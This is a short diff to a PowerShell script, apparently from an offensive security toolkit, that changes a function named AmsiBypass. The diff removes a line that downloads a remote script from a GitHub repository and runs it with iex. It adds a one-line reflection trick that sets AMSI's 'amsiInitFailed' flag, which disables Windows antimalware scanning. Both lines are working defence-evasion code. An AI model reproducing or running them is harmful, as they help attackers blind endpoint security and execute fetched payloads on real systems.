@@ -8,13 +8,7 @@ function Unzip
 }
 function AmsiBypass
 {
-    <#
-        .DESCRIPTION
-        Credit to Rastamouse
-        License: BSD 3-Clause
-    #>
-    #
-    $string = iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsicustom.ps1')
+    (([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
 }
 
 function dependencychecks
